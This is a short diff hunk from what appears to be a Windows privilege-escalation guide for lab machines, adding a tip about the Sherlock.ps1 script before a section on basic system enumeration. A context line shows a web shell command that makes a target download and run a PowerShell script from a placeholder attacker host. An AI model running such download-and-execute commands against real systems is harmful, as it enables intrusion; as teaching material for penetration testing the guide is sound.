@@ -16,6 +16,10 @@ The output shows either public exploits (E), or Metasploit modules (M) as indica
 view-source:10.10.10.X/shell.php?cmd=echo IEX(New-Object Net.WebClient).DownloadString("http://YourIP:8000/Sherlock.ps1"); | powershell -noprofile -
 ```
 
+```
+Don't forget to write "Find-AllVulns" to the bottom of the Sherlock.ps1
+```
+
 ## Basic Enumeration of the System
 
 Before we start looking for privilege escalation opportunities we need to understand a bit about the machine. We need to know what users have privileges. What patches/hotfixes the system has.
